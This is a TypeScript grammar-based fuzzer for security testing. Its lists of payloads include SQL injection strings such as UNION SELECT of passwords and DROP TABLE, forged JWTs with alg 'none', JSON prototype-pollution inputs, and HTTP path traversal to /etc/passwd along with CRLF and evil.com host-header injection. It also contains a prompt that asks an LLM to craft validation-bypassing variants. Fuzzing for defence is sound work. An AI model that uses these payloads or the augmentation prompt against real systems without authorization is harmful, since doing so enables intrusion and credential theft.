/**
 * Grammar-Based Fuzzer — Devansh Methodology
 *
 * "Generate valid-but-malicious inputs from grammar (e.g. SQL, JWT, HTTP)."
 *
 * Produces syntactically valid inputs that stress parsers and validators:
 * - SQL: injection payloads, UNION, stacked queries
 * - JWT: alg confusion, none alg, key confusion
 * - JSON: deeply nested, type confusion, unicode
 * - HTTP: header injection, chunked encoding, path traversal
 *
 * Can be augmented by LLM for context-aware mutations.
 */

import * as crypto from 'crypto';

export type GrammarId = 'sql' | 'jwt' | 'json' | 'http';

export interface FuzzResult {
  grammar: GrammarId;
  payload: string;
  /** Mutation applied (e.g. "union_select", "alg_none") */
  mutation?: string;
  /** Optional LLM-suggested variant */
  llmAugmented?: boolean;
}

// ─── SQL Grammar ───

const SQL_LITERALS = [
  "' OR '1'='1",
  "' OR 1=1--",
  "'; DROP TABLE users;--",
  "1' UNION SELECT null,null,null--",
  "1' UNION SELECT username,password FROM users--",
  "1; INSERT INTO logs VALUES ('x')--",
  "1' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
  "1' WAITFOR DELAY '0:0:5'--",
  "1' AND SLEEP(5)--",
  "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))--",
  "' OR ''='",
  "admin'--",
  "' OR ''='",
  "1' ORDER BY 1--",
  "1' ORDER BY 1,2--",
  "1' ORDER BY 1,2,3--",
];

const SQL_UNION_TEMPLATES = [
  "1' UNION SELECT {cols} FROM {table}--",
  "1' UNION ALL SELECT {cols} FROM {table}--",
  "1' UNION SELECT {cols} FROM {table} WHERE 1=0--",
];

const SQL_TABLES = ['users', 'admin', 'accounts', 'passwords', 'user', 'config'];
const SQL_COLS = ['id', 'username', 'password', 'email', 'name', '1', 'null', 'null,null'];

function generateSqlPayload(): FuzzResult {
  const roll = Math.random();
  if (roll < 0.5) {
    const payload = SQL_LITERALS[Math.floor(Math.random() * SQL_LITERALS.length)];
    return { grammar: 'sql', payload, mutation: 'literal' };
  }
  const tpl = SQL_UNION_TEMPLATES[Math.floor(Math.random() * SQL_UNION_TEMPLATES.length)];
  const table = SQL_TABLES[Math.floor(Math.random() * SQL_TABLES.length)];
  const cols = SQL_COLS.slice(0, 2 + Math.floor(Math.random() * 3)).join(', ');

  const payload = tpl.replace('{cols}', cols).replace('{table}', table);
  return { grammar: 'sql', payload, mutation: 'union_select' };
}

// ─── JWT Grammar ───

const JWT_ALGORITHMS = ['none', 'HS256', 'HS384', 'HS512', 'RS256', 'RS384', 'RS512'];

function base64UrlEncode(buf: Buffer): string {
  return buf.toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
}

function generateJwtPayload(): FuzzResult {
  const roll = Math.random();
  const header: Record<string, unknown> = {
    alg: JWT_ALGORITHMS[Math.floor(Math.random() * JWT_ALGORITHMS.length)],
    typ: 'JWT',
  };

  // Alg confusion: force "none" or mismatch
  if (roll < 0.3) {
    header.alg = 'none';
  } else if (roll < 0.5) {
    header.alg = 'HS256';
  }

  const payload: Record<string, unknown> = {
    sub: 'admin',
    iat: Math.floor(Date.now() / 1000),
    exp: Math.floor(Date.now() / 1000) + 3600,
  };

  try {
    const h = base64UrlEncode(Buffer.from(JSON.stringify(header), 'utf8'));
    const p = base64UrlEncode(Buffer.from(JSON.stringify(payload), 'utf8'));
    const sig = header.alg === 'none' ? '' : base64UrlEncode(crypto.randomBytes(32));
    const token = `${h}.${p}.${sig}`;

    return {
      grammar: 'jwt',
      payload: token,
      mutation: header.alg === 'none' ? 'alg_none' : 'alg_confusion',
    };
  } catch {
    return {
      grammar: 'jwt',
      payload: 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.',
      mutation: 'alg_none',
    };
  }
}

// ─── JSON Grammar ───

const JSON_MALICIOUS = [
  '{"__proto__":{"x":1}}',
  '{"constructor":{"prototype":{"x":1}}}',
  '{"a":1e999}',
  '{"a":-1e999}',
  '{"a":null,"a":1}',
  '{"a":["' + 'a'.repeat(1000) + '"]}',
  '{"a":"\\u0000"}',
  '{"a":"\u202E"}',
  '{"a":1,"a":2}',
  '{"a":{}}'.repeat(100),
  '{"a":"' + 'A'.repeat(10000) + '"}',
  '{"a":1.7976931348623157e+308}',
  '{"a":-1.7976931348623157e+308}',
  '{"a":NaN}',
  '{"a":Infinity}',
  '{"a":-Infinity}',
];

function generateJsonPayload(): FuzzResult {
  const payload = JSON_MALICIOUS[Math.floor(Math.random() * JSON_MALICIOUS.length)];
  return { grammar: 'json', payload, mutation: 'proto_or_type_confusion' };
}

// ─── HTTP Grammar ───

const HTTP_PATHS = [
  '/../../../etc/passwd',
  '/..%2F..%2F..%2Fetc%2Fpasswd',
  '/%2e%2e%2f%2e%2e%2fetc%2fpasswd',
  '/api/users/1',
  '/api/users/1%2F2',
  '/api/users/1%00',
  '/api/users/1%0d%0aX-Injected: true',
  '/api/users/1\nX-Injected: true',
  '/api/users/1\r\nX-Injected: true',
  '/api/users/1%0d%0a%0d%0aX-Injected: true',
  '/api/users/1?redirect=https://evil.com',
  '/api/users/1?url=javascript:alert(1)',
  '/api/users/1?callback=alert(1)',
  '/api/users/1?callback=__proto__',
];

const HTTP_HEADERS = [
  'X-Forwarded-For: 127.0.0.1',
  'X-Forwarded-Host: evil.com',
  'X-Original-URL: /admin',
  'X-Rewrite-URL: /admin',
  'Host: evil.com',
  'X-Forwarded-Host: evil.com',
  'X-Original-URL: /admin',
  'X-Real-IP: 127.0.0.1',
  'X-Forwarded-For: 127.0.0.1',
  'X-Forwarded-Proto: https',
  'Content-Length: 0',
  'Transfer-Encoding: chunked',
];

function generateHttpPayload(): FuzzResult {
  const path = HTTP_PATHS[Math.floor(Math.random() * HTTP_PATHS.length)];
  const header = HTTP_HEADERS[Math.floor(Math.random() * HTTP_HEADERS.length)];

  const methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'];
  const method = methods[Math.floor(Math.random() * methods.length)];

  let payload: string;
  const roll = Math.random();
  if (roll < 0.5) {
    payload = `${method} ${path} HTTP/1.1\r\nHost: localhost\r\n${header}\r\n\r\n`;
  } else {
    payload = `${method} ${path} HTTP/1.1\r\nHost: localhost\r\n${header}\r\n\r\n`;
  }

  return {
    grammar: 'http',
    payload,
    mutation: path.includes('..') ? 'path_traversal' : 'header_injection',
  };
}

// ─── Limits ───

const MAX_PAYLOAD_LENGTH = 64 * 1024;
const MAX_PAYLOAD_COUNT = 10_000;

// ─── Main API ───

const GENERATORS: Record<GrammarId, () => FuzzResult> = {
  sql: generateSqlPayload,
  jwt: generateJwtPayload,
  json: generateJsonPayload,
  http: generateHttpPayload,
};

/**
 * Generate a single fuzz payload for the given grammar
 */
export function generatePayload(grammar: GrammarId): FuzzResult {
  const g = grammar?.toLowerCase?.() || grammar;
  if (!GENERATORS[g as GrammarId]) {
    return { grammar: 'sql', payload: SQL_LITERALS[0], mutation: 'literal' };
  }
  const result = GENERATORS[g as GrammarId]();
  if (result.payload.length > MAX_PAYLOAD_LENGTH) {
    result.payload = result.payload.slice(0, MAX_PAYLOAD_LENGTH);
  }
  return result;
}

/**
 * Generate N payloads for the given grammar(s)
 */
export function generatePayloads(
  grammars: GrammarId | GrammarId[],
  count: number
): FuzzResult[] {
  const grammarsArray = Array.isArray(grammars) ? grammars : [grammars];
  const capped = Math.min(Math.max(0, Math.floor(count)), MAX_PAYLOAD_COUNT);
  const results: FuzzResult[] = [];

  for (let i = 0; i < capped; i++) {
    const g = grammarsArray[i % grammarsArray.length] as GrammarId;
    const r = generatePayload(g);
    results.push(r);
  }

  return results;
}

/**
 * Build prompt for LLM to suggest augmentations to a payload
 */
export function buildLlmAugmentPrompt(
  grammar: GrammarId,
  payload: string,
  context?: string
): string {
  const base = `You are a security fuzzer. Given this ${grammar.toUpperCase()} payload, suggest a variant that might:
  1. Bypass validation (e.g. encoding, case, whitespace)
  2. Trigger edge cases (e.g. empty, null, very long)
  3. Exploit known parser bugs (e.g. duplicate keys, type confusion)

  Current payload:
  \`\`\`
  ${payload.slice(0, 500)}
  \`\`\`

  Return ONLY the augmented payload, no explanation.`;
  return context ? `${base}\n\nContext: ${context}` : base;
}
